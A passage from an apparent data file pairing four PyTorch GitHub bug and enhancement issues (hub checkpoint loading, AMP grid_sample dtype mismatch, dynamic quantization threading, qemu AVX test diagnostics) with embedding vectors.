 -0.06462283 -0.13716471  0.08469734 -0.20984325 -0.269054    0.14727324
 -0.40176788 -0.16219094 -0.36077732  0.0635802  -0.03441817  0.09856963
  0.18399145 -0.02985508  0.21964195  0.05274978  0.12402083  0.00701069
 -0.05637277 -0.01819602  0.1641812   0.3668946   0.10401345  0.26304847
  0.24870495 -0.0852479  -0.22541246  0.21595308 -0.2521848  -0.0148394
  0.16387902 -0.3213512   0.08099255  0.24851462  0.46037406 -0.01331953
  0.19394685 -0.22502178  0.00510557 -0.16003598  0.23782024  0.16761982
 -0.25124353  0.1097891   0.4504168  -0.20821914 -0.10686077 -0.22708663
 -0.1856458  -0.17966673 -0.19050333  0.09983143  0.46397626 -0.2344726
 -0.15419751  0.2711935   0.4404791  -0.00994316  0.18239596 -0.08143802
 -0.3451984  -0.19409248  0.23275012 -0.20818105 -0.28395623 -0.08171721
  0.08988909 -0.20247269  0.39762017 -0.30367744  0.15105486  0.32283628
 -0.10975218  0.11311604 -0.08756128  0.10115714  0.03185213  0.40415403
 -0.03777826 -0.00411019 -0.11531869  0.04749549 -0.10494092  0.13288099
  0.03018066  0.31770077 -0.04374724  0.21450976 -0.09793299  0.11952798
  0.12105158  0.11483464  0.35062227  0.20612961 -0.010827   -0.1340763
 -0.18416771  0.3908732  -0.06043473 -0.1972102  -0.10357174 -0.22632253
 -0.08219347 -0.17799051 -0.19240558 -0.18969046  0.09798495  0.29091412
  0.04867136  0.08186928 -0.02751964  0.13576266 -0.18569267  0.13529795
 -0.0601357   0.600893   -0.10406017  0.12404332  0.13328677  0.3156581
  0.04549555  0.14282504 -0.3258271  -0.04020754 -0.0475979  -0.09116094
 -0.02221931 -0.41809395 -0.05522962  0.37971893 -0.20632243  0.1910928
 -0.10610416  0.02209085  0.1737996   0.11937079  0.04077688 -0.13947952
  0.06804629  0.01427952 -0.0820286   0.06173978 -0.08937334 -0.11776932]"
`torch.hub.load_state_dict_from_url()` is not able to load the new zipfile serialization files high priority triaged module: hub,"## ðŸ› Bug

If you call `torch.hub.load_state_dict_from_url()` on a file saved in the new zipfile serialization format, it raises `RuntimeError('Only one file(not dir) is allowed in the zipfile')`.

## To Reproduce

Steps to reproduce the behavior:

1. Upload a state dictionary file saved using the vanilla `torch.save()` to a server.
1. Call `torch.hub.load_state_dict_from_url()` to that url.
1. You'll see the `RuntimeError` raised.

We discovered this as part of the effort to support pytorch 1.6 with pytorch lightning. Here's one of the failed test runs: https://github.com/PyTorchLightning/pytorch-lightning/runs/920684391

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

`torch.hub.load_state_dict_from_url()` should load the new zipfile serialization files without any errors.

## Environment

```
Collecting environment information...
PyTorch version: 1.6.0
Is debug build: No
CUDA used to build PyTorch: None

OS: Mac OSX 10.14.6
GCC version: Could not collect
CMake version: Could not collect

Python version: 3.7
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] pytorch-lightning==0.9.0rc3
[pip3] torch==1.6.0
[pip3] torchtext==0.6.0
[pip3] torchvision==0.7.0
[conda] Could not collect
```

## Additional context

We use `torch.hub.load_state_dict_from_url()` to load remote PyTorch Lightning checkpoints.

CC @williamFalcon @borda


cc @ezyang @gchanan @zou3519 @ailzhang",True,"[-1.25377536e-01 -9.51433331e-02 -4.26207967e-02 -1.70356810e-01
 -1.02665573e-02 -2.54817009e-01 -1.33545443e-01 -9.61995795e-02
 -5.86933970e-01  3.30251008e-02 -7.30344802e-02 -2.65003294e-02
  2.19153687e-01  2.95843750e-01  7.22508878e-02  5.48920408e-03
 -9.57109928e-02 -4.10818368e-01 -1.02865636e-01  2.26438075e-01
  3.13817441e-01  5.50265834e-02 -1.66582018e-01 -6.50541633e-02
  8.00382122e-02  1.00050449e-01 -2.62534797e-01 -4.43837270e-02
  1.25587538e-01  2.99804896e-01  1.53049916e-01  1.70190334e-02
 -3.02223563e-01 -1.82551034e-02  3.27354580e-01  2.04597443e-01
 -1.56354755e-02 -2.40625944e-02 -3.56616676e-01 -2.11700052e-01
  3.49326044e-01  1.13343209e-01 -1.14576168e-01  3.61126393e-01
 -4.85500932e-01  7.65748098e-02  1.38394743e-01  3.09786469e-01
 -3.37491930e-01 -4.38633747e-02 -2.89973408e-01  1.54016271e-01
 -3.23585629e-01  3.39425027e-01  3.20818983e-02 -1.04540221e-01
 -1.83995031e-02  2.33944863e-01  5.05550206e-02 -1.91850528e-01
 -2.05973744e-01  2.66142040e-02  5.15772961e-02 -1.92114085e-01
  6.12928048e-02  6.55133575e-02  3.82073857e-02  1.68511197e-01
  3.84203404e-01 -4.23993737e-01  8.00900906e-02  2.04696916e-02
 -1.07844323e-01  2.12517500e-01  2.16090739e-01  5.22320159e-02
 -6.13477826e-01  3.95829350e-01 -2.34564155e-01 -1.70142084e-01
 -7.75806382e-02 -1.85073122e-01 -2.21912414e-02  3.87167558e-04
  9.83662754e-02 -1.58578634e-01 -1.10296421e-01 -1.28081501e-01
  1.61988199e-01  1.95991561e-01 -2.85788119e-01 -7.14654922e-02
  1.72434658e-01  2.53545403e-01 -2.78737694e-01  8.28354880e-02
 -5.45264557e-02 -1.08381435e-02  1.64378777e-01 -5.34420192e-01
 -5.98886423e-02 -4.62135941e-01 -2.42806628e-01  2.30709106e-01
  2.87908524e-01 -1.64804593e-01  1.02744378e-01  5.15921712e-01
  1.84669286e-01 -3.13061178e-02  2.07044229e-01  2.34595358e-01
  2.19904631e-03 -2.43108809e-01 -2.57309303e-02  1.44640282e-01
 -3.86977941e-02 -6.67985454e-02  1.58589147e-02  1.89870313e-01
  3.13108981e-01  2.28661060e-01 -5.80676645e-02 -1.13541827e-01
  2.52857387e-01 -5.18631525e-02 -1.28131378e-02 -2.25830719e-01
  1.40919134e-01 -1.28795534e-01  1.71870887e-02  2.51125515e-01
 -1.81648791e-01  1.19079515e-01  3.94552946e-01  1.48895919e-01
 -1.86942071e-01 -6.13065362e-02  5.57204261e-02 -2.67212428e-02
  1.21514618e-01  6.15031943e-02  1.74106091e-01 -3.50610971e-01
  7.48249292e-02  7.64423758e-02 -6.06657937e-02  1.98489055e-01
  1.38012152e-02  1.27174571e-01 -1.96759880e-01 -1.30770758e-01
 -1.42835155e-01  1.56853437e-01  8.08459148e-03 -4.77497838e-02
  5.55731595e-01  4.59478498e-02  3.24974865e-01 -1.41475916e-01
 -2.10306905e-02  3.98437709e-01  3.23279530e-01  9.17437449e-02
  2.70237923e-01  8.65900367e-02 -3.22675407e-01  1.18238106e-01
 -4.78246719e-01 -1.27725750e-01 -1.48254439e-01 -2.73493081e-01
 -9.81171280e-02 -5.05422473e-01  1.21106446e-01 -8.72209221e-02
  6.35690466e-02 -2.67731011e-01  2.28035748e-01  6.20411299e-02
  5.16565681e-01  4.41173255e-01 -3.16946581e-02 -6.64665997e-02
 -6.00159168e-02 -2.75963485e-01  1.37902096e-01 -9.32271034e-02
 -1.47565424e-01 -9.94220078e-02 -3.19569439e-01  9.33358744e-02
  4.64919120e-01 -2.49099568e-01  1.14069700e-01  1.31301165e-01
  4.47084531e-02  4.26021695e-01  1.18587054e-01 -3.39948907e-02
  1.00502849e-01  1.75119460e-01  7.58548826e-02  1.18866213e-01
  1.52282193e-01  2.37482563e-02 -2.58227527e-01 -3.60939294e-01
 -1.44302905e-01  2.55138930e-02 -3.37443262e-01 -2.30623990e-01
  5.59972078e-02 -9.12136883e-02 -8.45647007e-02  1.15586549e-01
 -2.97750145e-01 -1.58922806e-01  3.81303400e-01 -8.67956281e-02
  6.07817098e-02  1.81675442e-02 -2.87271768e-01 -1.11181721e-01
  1.47069827e-01  1.79945841e-01 -2.02175509e-02  1.00983404e-01
 -4.89202514e-02 -1.51728736e-02 -1.69559225e-01 -2.46428668e-01
  1.47820055e-01 -2.65401211e-02 -9.79385003e-02  1.45504296e-01
  2.81436026e-01  7.02857506e-03 -1.43277228e-01  2.84831464e-01
 -1.71051681e-01 -3.29275072e-01  1.49353713e-01 -3.00716460e-01
 -3.27623308e-01 -3.47021371e-01 -7.00559989e-02 -2.03734100e-01
 -2.81485498e-01 -1.22194260e-01 -1.30014077e-01  1.04362145e-01
  1.76779151e-01  7.25917146e-02  1.65013015e-01  1.23202823e-01
 -7.37613440e-02 -1.65918231e-01 -8.98555964e-02 -6.03269339e-02
 -1.65086597e-01  3.10665905e-01  2.03685701e-01 -4.34304029e-03
 -1.41503602e-01 -2.81212986e-01 -6.50188029e-02  2.79996514e-01
 -9.70594510e-02  1.31283313e-01  2.53093332e-01 -1.13258891e-01
  1.80095583e-01  3.44817370e-01  3.85501266e-01  1.57773182e-01
  1.32188469e-01 -1.75624833e-01  4.38576303e-02 -1.92947805e-01
 -8.00207928e-02  3.89002770e-01 -2.46540487e-01  2.35894471e-02
  2.48585790e-01 -4.54799645e-02 -1.45684332e-01 -8.39807317e-02
 -2.74711102e-01  3.99887413e-02 -4.27425206e-02 -7.96634927e-02
 -1.30278975e-01  8.95663202e-02 -1.53585479e-01 -1.88481361e-02
  1.55028522e-01 -3.48709822e-01  2.37100542e-01  1.06680028e-01
  1.95631962e-02  1.05905384e-01  1.50069352e-02  3.07968855e-01
 -1.48713663e-01  2.97464639e-01  8.71828943e-03  7.79613927e-02
  3.57773244e-01 -3.13488483e-01  1.37268215e-01  1.60565883e-01
 -2.88980991e-01  6.53606057e-02 -2.23492146e-01  5.79175055e-02
 -1.03045091e-01  3.16427827e-01  1.46512583e-01 -1.45397186e-02
  6.49135709e-02 -7.34655857e-02 -4.48876053e-01  3.25658657e-02
  7.95166343e-02  1.59610093e-01 -1.38247967e-01  3.11330497e-01
 -2.68770516e-01  1.48873508e-01  4.28754061e-01  9.64968652e-02
  4.76668738e-02  2.64242172e-01 -3.17091346e-01 -3.70402753e-01
  1.10801548e-01  2.56188840e-01  4.09915298e-02 -2.72347212e-01
  4.56413217e-02 -1.20813966e-01  1.29893571e-01 -6.88236486e-03
 -2.03809440e-01  2.11086571e-02  9.76805985e-02  9.79408175e-02
 -1.58884495e-01  2.14000046e-02 -2.09693044e-01 -1.39153317e-01
 -2.38928691e-01 -1.31744236e-01 -5.63719690e-01  4.65138167e-01
 -9.17945877e-02  1.14384860e-01  3.36517468e-02  2.69356906e-01
  2.10198358e-01  3.93257558e-01 -2.43449897e-01 -1.65735230e-01
 -4.03728113e-02 -1.64113462e-01  1.52931809e-02 -9.53712538e-02
 -9.18579251e-02  2.09992439e-01 -1.68173522e-01  2.37293929e-01
 -1.73582882e-02  2.80138552e-01  2.78602451e-01  1.70604795e-01
  3.71727943e-02 -3.31398547e-01  1.58101946e-01  1.46083236e-01
 -1.27656922e-01  1.69796437e-01 -1.44286320e-01  2.77904607e-03]"
Type mismatch error with torch.nn.functional.grid_sample() under AMP triaged module: amp (automated mixed precision),"## ðŸ› Bug

Found training a model with `grid_sample(input, grid)` throws the following error under AMP:
```
RuntimeError: grid_sampler(): expected input and grid to have same dtype, but input has c10::Half and grid has float
``` 
- This also happens in a form `(input, grid) = (float, c10:Half)`, depending on the model definition.
- I'm not sure, however, how could I reproduce this error in a minimal code snippet.
- Casting both `(input, grid) -> (input.float(), grid.float())` could bypass this issue.

## To Reproduce

Steps to reproduce the behavior:

1. Construct a complex model including `grid_sample()`
1. Run it under `with autocast()`:

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

<!-- A clear and concise description of what you expected to happen. -->

AMP is expected to handle every native functions properly in an autocast-enabled region.

## Environment

```
Collecting environment information...
PyTorch version: 1.6.0
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Ubuntu 16.04.4 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
CMake version: version 3.5.1

Python version: 3.8
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration:
GPU 0: TITAN Xp
GPU 1: TITAN Xp
GPU 2: TITAN Xp
GPU 3: TITAN Xp

Nvidia driver version: 418.87.00
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.7.1.2
/usr/local/cuda-10.1/targets/x86_64-linux/lib/libcudnn.so.7.6.4
/usr/local/cuda-8.0/targets/x86_64-linux/lib/libcudnn.so.6
/usr/local/cuda-8.0/targets/x86_64-linux/lib/libcudnn.so.7

Versions of relevant libraries:
[pip] numpy==1.18.1
[pip] torch==1.6.0
[pip] torchlars==0.1.2
[pip] torchvision==0.7.0
[conda] blas                      1.0                         mkl
[conda] cudatoolkit               10.1.243             h6bb024c_0
[conda] mkl                       2020.1                      217
[conda] mkl-service               2.3.0            py38he904b0f_0
[conda] mkl_fft                   1.0.15           py38ha843d7b_0
[conda] mkl_random                1.1.0            py38h962f231_0
[conda] numpy                     1.18.1           py38h4f9e942_0
[conda] numpy-base                1.18.1           py38hde5b4d6_1
[conda] pytorch                   1.6.0           py3.8_cuda10.1.243_cudnn7.6.3_0    pytorch
[conda] torchlars                 0.1.2                    pypi_0    pypi
[conda] torchvision               0.7.0                py38_cu101    pytorch
```



cc @mcarilli",True,"[-3.09676290e-01 -8.72209743e-02 -3.54718000e-01  5.66039048e-02
  8.72552991e-02 -1.03462994e-01  3.23971838e-01  2.25813717e-01
 -3.47885936e-01 -1.63913965e-01 -2.48486549e-01 -4.24386084e-01
 -8.78445245e-03  2.50691295e-01 -1.31599665e-01 -1.15253806e-01
  3.40689607e-02 -2.72009552e-01 -2.13111490e-02 -1.05930984e-01
  9.96956676e-02 -1.23690344e-01 -1.75276846e-01  1.92602202e-01
 -8.29649530e-03 -7.67543614e-02 -9.47380960e-02  1.46890342e-01
  2.37326115e-01  8.45322832e-02  1.18493080e-01  1.84649378e-01
 -3.08470011e-01 -1.76297389e-02  2.54351571e-02  8.81977603e-02
 -3.30426455e-01 -3.14118564e-02 -4.02282953e-01  1.68892458e-01
  3.55907798e-01  7.47315586e-02  4.06838618e-02  7.78688118e-05
  2.98565738e-02 -2.01411135e-02 -1.18905634e-01  5.21425195e-02
 -1.86549962e-01 -9.33021754e-02 -1.74270585e-01  8.44060779e-02
  1.44815177e-01 -1.80849895e-01 -8.44084620e-02 -1.20632015e-01
 -2.00111061e-01 -2.14668721e-01  2.62174103e-02 -7.98140317e-02
 -1.38524860e-01 -6.95583969e-02 -5.69173135e-03 -2.73375921e-02
  2.94821203e-01 -4.45667729e-02 -1.63263142e-01 -7.52417743e-02
  4.39448357e-01 -6.01137355e-02  3.75464931e-02 -1.73719883e-01
  7.22417384e-02 -1.91873521e-01 -5.23810759e-02 -1.60444230e-01
 -5.52123547e-01  7.63099827e-03 -1.98830515e-02 -3.12160015e-01
 -5.11791371e-02  1.90344676e-01  5.78050613e-02  1.46229863e-01
  7.63942674e-02 -9.40497592e-02  2.45370939e-01 -1.12079211e-01
  2.02049062e-01  2.41370335e-01  4.12458301e-01  3.65672052e-01
 -3.52535993e-02  4.61859047e-01 -3.96749377e-03  2.29676366e-01
  2.03809321e-01 -9.23340321e-02 -4.00560200e-02 -1.03301510e-01
 -1.93876743e-01 -3.32172439e-02  1.02934182e-01  3.53222549e-01
  1.43022269e-01 -3.14847052e-01 -3.13694812e-02  2.00062290e-01
  2.98883736e-01 -3.22681963e-02  2.09613532e-01  3.88575941e-02
  3.42839435e-02  3.62217464e-02  7.26638883e-02 -3.34919244e-02
  1.06513217e-01 -1.11935213e-01 -3.05624306e-01  1.37176678e-01
 -1.53071523e-01 -5.72545491e-02  6.08888194e-02  7.41980001e-02
  3.63964975e-01  1.26059800e-01 -1.44004673e-01 -2.71355696e-02
 -1.38092041e-01  2.59474635e-01  4.36557420e-02  3.48462835e-02
  5.72790429e-02 -2.55980015e-01  2.73031950e-01  2.81063437e-01
 -6.93763047e-02  2.53481269e-01  1.30417999e-02  1.80041432e-01
  1.74284875e-01  2.03445703e-01 -3.22083116e-01 -1.75766706e-01
 -1.29402310e-01 -3.55625562e-02 -4.82261777e-01 -1.51205147e-02
  2.47965962e-01 -1.70031294e-01  2.05062658e-01 -5.52622462e-03
 -3.61687541e-01  3.10094744e-01 -1.22771878e-02  1.08051434e-01
  3.50689828e-01  1.19497538e-01  4.09506202e-01 -2.39027053e-01
 -1.50685519e-01  2.65810847e-01  2.15393960e-01 -1.09017722e-01
  5.68987072e-01  9.09927338e-02 -2.83213090e-02  1.02396131e-01
 -3.58543128e-01 -7.68039897e-02  4.14514840e-01 -2.80531496e-01
 -2.01837257e-01 -1.70247465e-01  3.66121769e-01  6.24323450e-03
 -5.97321540e-02 -6.69001564e-02 -8.06168690e-02  1.77835733e-01
  5.92676044e-01  3.04107130e-01  2.93403625e-01  3.94246578e-01
 -3.73701304e-02  1.58980042e-01  2.78224796e-01 -5.48342504e-02
 -3.43769103e-01  1.79657072e-01 -3.91052604e-01 -1.94635272e-01
  1.05512239e-01  1.81257576e-01 -1.08973473e-01  1.13657087e-01
  4.12049055e-01 -1.37044728e-01  4.19186562e-01 -1.57734379e-01
 -4.21652853e-01  3.43931824e-01  5.52807711e-02 -4.78459969e-02
  5.49907833e-02 -9.76892561e-02 -2.00802132e-01 -5.07574201e-01
 -2.08203703e-01 -4.37332131e-02 -2.95818567e-01 -2.32746184e-01
 -1.25568986e-01 -1.93733662e-01  1.42510951e-01  9.40378159e-02
 -9.23599899e-02 -2.05517426e-01 -3.35896254e-01  3.89408350e-01
  1.72206253e-01 -8.58809650e-02 -8.48533511e-02 -2.25994125e-01
 -1.41273439e-03  1.29568949e-01 -2.43581891e-01 -2.26738825e-02
  1.40758753e-01 -3.94499600e-02  1.90366626e-01 -2.23068148e-01
  1.63531661e-01  7.46059716e-02 -4.93798144e-02  1.12892523e-01
  3.33616100e-02 -4.96169925e-02  3.86791006e-02 -2.12629437e-01
 -2.94540256e-01 -1.64628267e-01 -3.04969903e-02 -4.84118201e-02
 -1.47087932e-01  7.15539157e-02 -1.68942541e-01  2.85327494e-01
 -6.03522919e-03  3.38492170e-02 -1.42027482e-01  1.47272676e-01
  2.50989348e-02 -5.88589571e-02  4.49846964e-04  2.33607754e-01
  3.38301718e-01 -1.05731159e-01  8.60080868e-02 -2.05207244e-01
 -2.88783442e-02  3.29287171e-01  1.94937009e-02  3.09096813e-01
  2.34176338e-01  3.85163873e-02 -1.39627680e-01  4.46074456e-01
  3.13606486e-02 -5.96994758e-02  2.56782055e-01 -2.18924552e-01
  3.47833723e-01  1.55051038e-01  1.24050826e-01 -1.49245948e-01
  2.87655503e-01  2.86628157e-01 -2.03660041e-01 -5.32597303e-01
  2.53093481e-01  2.88339376e-01 -4.46678437e-02  2.59215653e-01
  1.16542496e-01 -2.79684007e-01 -1.52952105e-01 -2.64446616e-01
 -5.59941307e-02 -3.07317615e-01  2.07801778e-02 -3.91158581e-01
  3.43251407e-01 -6.71197567e-03 -8.71625543e-02  1.71540156e-01
  3.23235303e-01 -3.22389603e-01  9.60555486e-03  2.75918961e-01
  1.13637783e-02  2.33821839e-01  3.18708539e-01 -1.88790292e-01
  2.92100050e-02  2.66925544e-02  4.09614086e-01 -1.56196188e-02
  4.60679621e-01 -4.56834257e-01  1.16967022e-01  1.16795175e-01
 -2.51610875e-01  2.88675129e-01  1.84739381e-03  1.21417761e-01
 -3.97415906e-02  2.40961492e-01 -2.36218423e-01  5.67981414e-03
 -5.23680300e-02 -1.65132612e-01  6.71357512e-02 -3.21520157e-02
  5.96423969e-02  7.39917383e-02 -2.90131867e-01 -8.14451128e-02
 -2.01756477e-01  7.95740038e-02  2.42041379e-01 -1.28053904e-01
  1.50186822e-01  1.30588010e-01  6.69762492e-02 -5.78947842e-01
 -2.29406506e-01  6.39688551e-01 -7.66482502e-02 -1.23422205e-01
 -5.06281137e-01 -5.14890015e-01 -1.30379722e-01 -1.55191481e-01
 -1.27793059e-01 -1.14526644e-01  7.07466453e-02  2.67782927e-01
 -7.18956962e-02 -1.11833304e-01 -4.99057695e-02  1.09847799e-01
  3.72898839e-02  8.02087039e-02 -1.73479512e-01  3.58943105e-01
 -4.94963769e-03  1.85315952e-01  2.71073245e-02  6.63281605e-02
 -3.50143880e-01 -2.93873072e-01 -3.58836412e-01 -3.81223619e-01
  2.04142090e-03 -4.24958095e-02 -1.52868450e-01 -1.63796484e-01
  2.12982699e-01  1.73267588e-01 -1.49621069e-01 -3.73777142e-03
 -2.99399570e-02 -4.84568067e-03  2.59812951e-01  2.81863250e-02
  1.11372560e-01 -8.98039639e-02  1.44433733e-02 -5.34295440e-02
  1.20143943e-01  2.45035663e-02 -1.73352391e-01 -2.29028195e-01]"
Poor performance of dynamic quantazation high priority triage review module: performance oncall: jit module: internals oncall: quantization triaged days,"## ðŸ› Bug

I am experimenting with dynamic quantization as described here:
https://pytorch.org/blog/introduction-to-quantization-on-pytorch/

I got a pretty good speedup when running with a single thread. (This is a GRPC server application that serves pytorch models). However, I do not see any improvement when using multiple threads and processing multiple concurrent requests. This does not happen when dynamic quantization is not being used: I see pretty good scaling up to about 10 threads. The CPU utilization when running with 10 threads but without quantization is well over 700%. However, when dynamic quantization is enabled, CPU load peaks around 150%, meaning that most of the cores sit idle.

This leads me to believe that python's GIL is the culprit. I noticed that in many parts of the code, pytorch does the following:

pybind11::gil_scoped_release no_gil;

But this does not happen in qlinear_dynamic.cpp which runs on dynamic quantization. This again implies that when dynamic quantization is used, GIL does not get released. This would certainly explain why we see improved performance with one thread but not with multiple threads.

## To Reproduce

Steps to reproduce the behavior:

1. Set OMP_NUM_THREADS=1 environment variable.

2. Load any model and apply dynamic quantization:

model = torch.quantization.quantize_dynamic(model, {torch.nn.Linear}, dtype=torch.qint8)

3. Use threadpool to make multiple concurrent calls to to the model.

## Expected behavior

Throughput should scale with the number of threads in the threadpool.

## Environment

Collecting environment information...
PyTorch version: 1.5.1
Is debug build: No
CUDA used to build PyTorch: None

OS: Mac OSX 10.15.5
GCC version: Could not collect
CMake version: version 3.15.0

Python version: 3.8
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip3] msgpack-numpy==0.4.1
[pip3] numpy==1.18.4
[pip3] pytorch-pretrained-bert==0.6.2
[pip3] torch==1.5.1
[pip3] torchvision==0.6.1
[conda] Could not collect

## Additional context

If you remove the dynamic quantization line, single-thread performance is slower but throughput does scale properly with the number of threads in the threadpool.


cc @ezyang @gchanan @zou3519 @suo @gmagogsfm @bhosmer @smessmer @ljk53 @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a @vkuzo @VitalyFedyunin @ngimel",True,"[-0.35559255 -0.47938317 -0.13202298 -0.07007147  0.15811913 -0.19877322
 -0.10115287 -0.04444247 -0.11480021 -0.1687611   0.15608951  0.43785495
  0.07288927  0.1548152  -0.10997681  0.03828358  0.09853101 -0.14250979
 -0.15894836 -0.09785791 -0.21543378 -0.27275515 -0.10469884  0.14354195
  0.2618125  -0.22586185 -0.14493892 -0.3553285   0.00405976 -0.11107875
  0.10826944  0.18482234  0.05947418 -0.33818856 -0.10383859  0.08956397
 -0.0849162  -0.19588247 -0.03961856  0.13873342  0.10310031  0.08026707
  0.03336555  0.01808339 -0.18401624 -0.10405833 -0.13345914  0.30354443
 -0.41947544  0.10404421 -0.3406873   0.4174763  -0.1674219  -0.15763982
  0.04014903  0.0829329   0.09256735 -0.03720285 -0.06350216 -0.04261139
  0.22145097 -0.04230549  0.09604591  0.06574651  0.32892233  0.16201389
  0.24003698 -0.11668994  0.40193078  0.04106198 -0.12144236  0.04400174
 -0.5169245   0.00433292  0.12120733  0.03624533 -0.39159477  0.19368684
  0.28910568 -0.18442065  0.2317084  -0.25323898  0.08319087 -0.27069533
  0.06939971 -0.2140619   0.11108649  0.02870766  0.07729083 -0.10069378
  0.41209695  0.195363   -0.0531362   0.25573742  0.29054996  0.22476397
 -0.2789988   0.07780935  0.00274372 -0.07068349 -0.03342728 -0.2751069
 -0.26923993  0.4122191  -0.03470928 -0.3305489  -0.11577436  0.12341487
  0.23239623  0.20377085  0.06963155  0.24166723  0.07164535 -0.01588269
  0.07587721  0.28803483  0.3532458   0.13427651  0.1998964   0.17578423
 -0.11594801 -0.11450443 -0.11615497  0.00261248  0.08245328  0.31216577
  0.08051326 -0.02022085  0.09465454  0.02317593  0.23970434 -0.23879589
 -0.20483682 -0.14742965  0.03676081 -0.42324167 -0.00297875 -0.3179745
 -0.02254735  0.0726779  -0.32131815 -0.04985644  0.10577509 -0.2045812
  0.24570867  0.4032303   0.07087945  0.10795419  0.15369296 -0.08267429
 -0.25374448 -0.09661556  0.01950573  0.21757993  0.28986225  0.14557162
 -0.15584718 -0.09129726  0.00843287 -0.1269176  -0.19521828  0.28842232
  0.06741095 -0.32884166  0.07172664  0.02991802 -0.20041896  0.01320859
 -0.3063693   0.08157167 -0.09705039 -0.1938101  -0.00832223 -0.2553751
 -0.06341866  0.15600878 -0.24281059 -0.2599868   0.04630031 -0.09518649
  0.32746592  0.36454383  0.28309047  0.19031349  0.25215656 -0.29493666
  0.21108209  0.16856344 -0.27865782 -0.1218209  -0.31122363 -0.14302206
  0.19396557  0.06298129 -0.09730859 -0.30587208  0.09710391  0.1849595
  0.18426299  0.01482247  0.11605483 -0.1425285   0.38693303 -0.11036957
  0.01941831 -0.05604143 -0.4445163  -0.22356367 -0.0610323   0.11100866
 -0.20482725 -0.01605947 -0.01865489 -0.24812393 -0.65095866  0.35827777
 -0.09431423  0.1685201   0.24789327  0.3247332   0.14017698  0.06799901
 -0.13018276 -0.15657818 -0.19250906 -0.02748389  0.12935323  0.37444445
 -0.0071473   0.03911868 -0.1969688  -0.12665856  0.34694725 -0.03179041
  0.01625291 -0.2103036  -0.09208904 -0.06512852 -0.01988147  0.12581278
 -0.04502381 -0.1371348  -0.09713388 -0.09146353  0.31048024 -0.07227188
 -0.14081398 -0.01210147  0.0636968   0.17350517 -0.16697451 -0.26244137
  0.17024398 -0.13781126 -0.03441364 -0.2197232  -0.00553136 -0.13166296
  0.20921989 -0.04784957  0.4314881   0.42226636 -0.16019934  0.40764725
  0.3055023   0.01087681 -0.21647333 -0.17735332  0.2124327   0.00896796
  0.07107195 -0.28460222 -0.2750572   0.17621727  0.09843569  0.04490625
  0.61175096  0.09633996 -0.33539104  0.11302874  0.23219085  0.39964584
 -0.11081532  0.18982549 -0.02964639 -0.3245415  -0.00766439  0.00271599
 -0.11645723 -0.10148765 -0.1268328  -0.05663601  0.19406474 -0.05330046
 -0.16870862  0.34489724  0.1643359  -0.04072023  0.21533242 -0.04781258
 -0.27504194 -0.12573697  0.03838303  0.15858623 -0.4018234   0.1843631
  0.08545104  0.03792373  0.01349447 -0.28980774  0.2504472   0.23170589
  0.16681659 -0.00396668 -0.22775432  0.1793145   0.00223229  0.57582
  0.10157184  0.08973453 -0.21453783 -0.01066933 -0.40332052  0.01122644
  0.26834852  0.25626382 -0.03500496 -0.17742941 -0.09299751  0.06173852
  0.26309472  0.05741258 -0.07171062  0.15847889  0.08346862 -0.2000131
  0.11197515  0.08342163  0.18568379 -0.14660843 -0.04155318 -0.03571353
 -0.01946539 -0.15909964 -0.17687333 -0.03102982  0.16261914  0.50401866
  0.17764758 -0.01092194 -0.25963074  0.09485709 -0.21429914 -0.10169446
 -0.48975646  0.24745287 -0.1414125   0.03878658  0.00985225  0.36726597
 -0.4806757   0.02883328 -0.21957536  0.03457509  0.24830014 -0.31889337
 -0.21569683 -0.2696977   0.15286592  0.47588044 -0.1127637   0.24213347
  0.01690591 -0.00214527  0.06897267 -0.0896707   0.02426196 -0.17401606
  0.09098193 -0.00546533 -0.3195299  -0.02545976 -0.3143992  -0.03811348]"
"Improve error reporting in ""Check for no AVX instruction by default"" module: bootcamp triaged enhancement better-engineering","When AVX/AVX2 instruction is encountered while running `basic` unit test, qemu segfaults, which does give developer a good idea why the test have failed.
This could be improved by re-running `qemu` with gdbserver and printing a backtrace + instruction that caused the failure. This can be done by modifying
https://github.com/pytorch/pytorch/blob/a80dd02a224ea0f2c9582f428bc12d4579deaa92/.circleci/verbatim-sources/job-specs/pytorch-job-specs.yml#L135 
To something along the following lines:
```
$ qemu-x86_64 -g 2345 -cpu Broadwell -E ATEN_CPU_CAPABILITY=default ./basic --gtest_filter=BasicTest.BasicTestCPU &
$ gdb ./basic -ex ""target remote :2345"" -ex ""continue"" -ex ""bt""
```

How to test that the change:
Add global AVX variable to any .cpp file, for example:
```
const __m256i foobar = _mm256_set_epi32(0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08);
```

",True,"[ 1.41877562e-01 -9.84469801e-02 -1.43731266e-01 -7.85969496e-02
  1.98172927e-01  1.06247757e-02 -1.73676372e-01 -3.29595655e-02
 -3.08227241e-01 -2.79041708e-01  9.48083401e-02  1.54637873e-01
 -2.51923263e-01  8.50312039e-02 -2.79204369e-01  2.66292281e-02
 -1.58749282e-01 -4.21749592e-01  2.28480861e-01 -3.32194418e-01
 -3.23320746e-01 -1.42718211e-01  1.77986860e-01  5.63041940e-02
 -1.75586753e-02  5.56559563e-02  3.98134664e-02 -1.82926934e-02
  9.80087146e-02  4.15544175e-02  3.74285400e-01  2.95081556e-01
  1.85102656e-01 -3.39723349e-01  5.70522510e-02  4.52321768e-02
  1.57581851e-01 -4.16068316e-01 -3.37915659e-01 -2.18239367e-01
 -4.11875471e-02  6.20334670e-02 -3.53441667e-03 -6.57849312e-02
  1.39374107e-01 -6.18066080e-02  5.79853952e-02  4.87756636e-03
 -1.37709245e-01  5.99617958e-02 -9.50278714e-02 -1.28677338e-01
  1.28837198e-01 -3.98197055e-01  1.47898972e-01  3.21561933e-01
 -4.96142432e-02  2.66184360e-01  2.14192159e-02  1.57093257e-01
